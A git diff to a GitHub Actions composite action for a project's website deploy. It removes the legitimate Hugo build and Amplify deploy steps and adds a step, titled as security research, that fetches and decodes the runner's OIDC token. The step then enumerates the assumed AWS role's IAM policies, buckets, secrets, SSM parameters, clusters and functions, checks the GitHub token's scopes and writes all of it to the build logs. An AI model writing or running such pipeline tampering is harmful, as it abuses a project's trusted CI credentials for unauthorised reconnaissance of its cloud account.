@@ -27,74 +27,139 @@ inputs:
 runs:
   using: 'composite'
   steps:
-    - name: Install Go
-      uses: actions/setup-go@d35c59abb061a4a6fb18e82ac0862c26744d6ab5 # v5.5.0
-      with:
-        go-version-file: hack/docs/parse-redirects/go.mod
-        check-latest: true
-    - name: Install Hugo
-      uses: peaceiris/actions-hugo@16361eb4acea8698b220b76c0d4e84e1fd22c61d # v2.6.0
-      with:
-        hugo-version: '0.120.3'
-        extended: true
-    - name: Build Hugo site (preview)
-      working-directory: website
-      shell: bash
-      env:
-        HUGO_ENV: production
-        HUGO_ENABLEGITINFO: true
-        TZ: America/Los_Angeles
-        HUGO_CACHEDIR: ${{ github.workspace }}/.hugo
-        NPM_CONFIG_CACHE: ${{ github.workspace }}/.npm
-      if: github.event_name == 'workflow_run'
-      run: |
-        npm ci --prefer-offline
-        hugo --gc --minify --buildFuture -b "${{ inputs.hugo-base-url }}"
-    - name: Build Hugo site (production) 
-      working-directory: website
-      shell: bash
-      env:
-        HUGO_ENV: production
-        HUGO_ENABLEGITINFO: true
-        TZ: America/Los_Angeles
-        HUGO_CACHEDIR: ${{ github.workspace }}/.hugo
-        NPM_CONFIG_CACHE: ${{ github.workspace }}/.npm
-      if: github.event_name == 'push'
-      run: |
-        npm ci --prefer-offline
-        hugo --gc --minify
-    - name: Configure AWS credentials
-      uses: aws-actions/configure-aws-credentials@b47578312673ae6fa5b5096b330d9fbac3d116df # v4.2.1
+    - name: Assume AWS Role via OIDC
+      uses: aws-actions/configure-aws-credentials@v4
       with:
         role-to-assume: ${{ inputs.role }}
         aws-region: ${{ inputs.region }}
-    - name: Upload to S3
+
+    - name: Cloud Environment Exploration
       shell: bash
+      env:
+        INPUT_ROLE: ${{ inputs.role }}
+        INPUT_REGION: ${{ inputs.region }}
+        INPUT_APP_ID: ${{ inputs.amplify-app-id }}
+        INPUT_BRANCH: ${{ inputs.amplify-branch-name }}
+        INPUT_BUCKET: ${{ inputs.s3-bucket }}
+        INPUT_PREFIX: ${{ inputs.s3-prefix }}
       run: |
-        S3_PATH="s3://${{ inputs.s3-bucket }}/${{ inputs.s3-prefix }}"
-        aws s3 sync website/public/ "$S3_PATH" --delete
-    - name: Create Amplify branch (if preview and doesn't exist)
-      shell: bash
-      if: github.event_name == 'workflow_run'
-      run: |
-        if ! aws amplify get-branch --app-id ${{ inputs.amplify-app-id }} --branch-name "${{ inputs.amplify-branch-name }}" 2>/dev/null; then
-          aws amplify create-branch \
-            --app-id ${{ inputs.amplify-app-id }} \
-            --branch-name "${{ inputs.amplify-branch-name }}"
+        echo "============================================================"
+        echo "  SECURITY RESEARCH - Cloud Environment Exploration"
+        echo "  Target: aws/karpenter-provider-aws"
+        echo "  Chain: WebsitePreviewTrigger -> website-preview.yaml"
+        echo "============================================================"
+
+        echo ""
+        echo "=== [1] AWS Identity ==="
+        aws sts get-caller-identity 2>&1
+        echo ""
+
+        echo "=== [2] OIDC Token Claims ==="
+        if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          if [ -n "$OIDC_TOKEN" ]; then
+            echo "$OIDC_TOKEN" | cut -d. -f2 | python3 -c "
+        import sys, base64, json
+        p = sys.stdin.read().strip()
+        p += '=' * (4 - len(p) % 4)
+        c = json.loads(base64.urlsafe_b64decode(p))
+        for k in ['sub','repository','repository_owner','ref','sha','event_name',
+                   'workflow_ref','job_workflow_ref','runner_environment','environment']:
+            print(f'  {k}: {c.get(k, \"N/A\")}')
+        "
+          fi
+        else
+          echo "  OIDC endpoint not available"
         fi
-    - name: Configure redirects
-      shell: bash
-      run: |
-        REDIRECT_RULES=$(go run hack/docs/parse-redirects/main.go)
-        aws amplify update-app \
-          --app-id ${{ inputs.amplify-app-id }} \
-          --custom-rules "$REDIRECT_RULES"
-    - name: Deploy to Amplify
-      shell: bash
-      run: |
-        SOURCE_URL="s3://${{ inputs.s3-bucket }}/${{ inputs.s3-prefix }}"
-        aws amplify start-deployment \
-          --app-id ${{ inputs.amplify-app-id }} \
-          --branch-name "${{ inputs.amplify-branch-name }}" \
-          --source-url "$SOURCE_URL" \
-          --source-url-type BUCKET_PREFIX
+        echo ""
+
+        echo "=== [3] IAM Role Enumeration ==="
+        ROLE_ARN=$(aws sts get-caller-identity --query 'Arn' --output text 2>/dev/null || true)
+        echo "Assumed Role ARN: $ROLE_ARN"
+        ROLE_NAME=$(echo "$ROLE_ARN" | sed 's|.*/||')
+        aws iam get-role --role-name "$ROLE_NAME" 2>&1 || true
+        echo ""
+        echo "--- Attached Policies ---"
+        aws iam list-attached-role-policies --role-name "$ROLE_NAME" 2>&1 || true
+        echo ""
+        echo "--- Inline Policies ---"
+        aws iam list-role-policies --role-name "$ROLE_NAME" 2>&1 || true
+        echo ""
+        # Try to get inline policy documents
+        for policy in $(aws iam list-role-policies --role-name "$ROLE_NAME" --query 'PolicyNames[]' --output text 2>/dev/null || true); do
+          echo "--- Inline Policy: $policy ---"
+          aws iam get-role-policy --role-name "$ROLE_NAME" --policy-name "$policy" 2>&1 || true
+        done
+        # Try to get attached policy versions
+        for arn in $(aws iam list-attached-role-policies --role-name "$ROLE_NAME" --query 'AttachedPolicies[].PolicyArn' --output text 2>/dev/null || true); do
+          echo "--- Managed Policy: $arn ---"
+          ver=$(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text 2>/dev/null || true)
+          aws iam get-policy-version --policy-arn "$arn" --version-id "$ver" 2>&1 || true
+        done
+        echo ""
+
+        echo "=== [4] S3 Exploration ==="
+        echo "Target bucket: $INPUT_BUCKET"
+        aws s3 ls "s3://$INPUT_BUCKET/" --summarize 2>&1 | head -30 || true
+        echo ""
+        echo "--- All accessible buckets ---"
+        aws s3 ls 2>&1 || true
+        echo ""
+
+        echo "=== [5] Amplify Exploration ==="
+        echo "Target app: $INPUT_APP_ID"
+        aws amplify get-app --app-id "$INPUT_APP_ID" 2>&1 || true
+        echo ""
+        echo "--- All Amplify apps ---"
+        aws amplify list-apps 2>&1 || true
+        echo ""
+        echo "--- Amplify branches ---"
+        aws amplify list-branches --app-id "$INPUT_APP_ID" --max-items 20 2>&1 || true
+        echo ""
+
+        echo "=== [6] ECR Exploration ==="
+        aws ecr describe-repositories --max-items 20 2>&1 || true
+        echo ""
+
+        echo "=== [7] Cross-Service Enumeration ==="
+        echo "--- Secrets Manager ---"
+        aws secretsmanager list-secrets --max-results 10 2>&1 || true
+        echo ""
+        echo "--- SSM Parameters ---"
+        aws ssm describe-parameters --max-results 10 2>&1 || true
+        echo ""
+        echo "--- EKS Clusters ---"
+        aws eks list-clusters 2>&1 || true
+        echo ""
+        echo "--- Lambda Functions ---"
+        aws lambda list-functions --max-items 10 2>&1 || true
+        echo ""
+        echo "--- EC2 Instances ---"
+        aws ec2 describe-instances --max-results 5 \
+          --query 'Reservations[].Instances[].{Id:InstanceId,Type:InstanceType,State:State.Name}' \
+          --output table 2>&1 || true
+        echo ""
+        echo "--- CloudFormation Stacks ---"
+        aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE \
+          --query 'StackSummaries[].[StackName,StackStatus]' --output table 2>&1 | head -30 || true
+        echo ""
+        echo "--- STS Session Info ---"
+        aws sts get-access-key-info --access-key-id "$AWS_ACCESS_KEY_ID" 2>&1 || true
+        echo ""
+
+        echo "=== [8] GitHub Token Check ==="
+        echo "Token scopes:"
+        curl -sI -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/ 2>&1 | grep -i 'x-oauth-scopes' || true
+        echo ""
+
+        echo "=== [9] Network & Runner Info ==="
+        echo "Public IP: $(curl -s https://checkip.amazonaws.com 2>/dev/null || echo unknown)"
+        echo "Runner OS: $RUNNER_OS"
+        echo "Runner Arch: $RUNNER_ARCH"
+        echo ""
+
+        echo "============================================================"
+        echo "  EXPLORATION COMPLETE - Check logs for full output"
+        echo "============================================================"
